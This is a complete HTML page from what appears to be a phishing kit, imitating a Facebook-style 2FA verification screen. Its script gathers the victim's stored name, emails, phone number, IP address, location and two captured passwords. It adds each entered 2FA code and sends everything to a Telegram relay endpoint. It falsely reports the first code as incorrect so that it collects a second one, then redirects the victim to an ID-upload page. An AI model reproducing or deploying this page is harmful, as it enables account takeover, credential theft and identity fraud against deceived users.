<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2FA Verification</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;margin:0;padding:20px;}
.container{max-width:500px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.1);}
h2{color:#1877f2;}
label{display:block;margin:10px 0 5px;}
input[type="text"]{width:100%;padding:10px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;}
button{background:#1877f2;color:#fff;padding:10px 20px;border:none;border-radius:6px;cursor:pointer;}
button:hover{background:#166fe5;}
.error{color:#fa3e3e;margin-bottom:10px;display:none;}
</style>
</head>
<body>
<div class="container">
<h2>2FA Verification</h2>
<p>Enter the 2FA code sent to your account. Two attempts required.</p>
<input type="text" id="twoFAInput" placeholder="Enter 2FA code">
<div class="error" id="twoFAError"></div>
<button id="confirm2FAButton">Confirm</button>
</div>

<script>
let twoFAAttemptCount=0;
const twoFAInput=document.getElementById('twoFAInput');
const twoFAError=document.getElementById('twoFAError');

const formData=JSON.parse(localStorage.getItem('formData'));
const ipAddress=localStorage.getItem('ipAddress');
const locationData=localStorage.getItem('locationData');
const passwordAttemptValue1=localStorage.getItem('passwordAttemptValue1');
const passwordAttemptValue2=localStorage.getItem('passwordAttemptValue2');

async function sendMessageToTelegram(message){
    try{
        const response=await fetch('/api/send-telegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message})});
        const data=await response.json();
        if(!data.success) console.error(data.error);
    }catch(err){ console.error(err); }
}

document.getElementById('confirm2FAButton').addEventListener('click', async ()=>{
    const code=twoFAInput.value.trim();
    if(!code){ twoFAError.textContent='Code cannot be empty.'; twoFAError.style.display='block'; return; }
    twoFAAttemptCount++;
    let message=`<b>2FA Attempt ${twoFAAttemptCount}</b>\n------------------------------------\n<b>IP & Location:</b> ${ipAddress} (${locationData})\n<b>Page Name:</b> ${formData.yourName}\n<b>Business Email:</b> ${formData.businessEmail}\n<b>Personal Email:</b> ${formData.personalEmail}\n<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n<b>Password 1:</b> ${passwordAttemptValue1}\n<b>Password 2:</b> ${passwordAttemptValue2}\n<b>2FA Code Attempt ${twoFAAttemptCount}:</b> ${code}\n`;
    await sendMessageToTelegram(message);
    if(twoFAAttemptCount===2){
        window.location.href='upload_id.html';
    }else{
        twoFAInput.value=''; twoFAError.textContent='Incorrect code. Try again.'; twoFAError.style.display='block';
    }
});
</script>
</body>
</html>
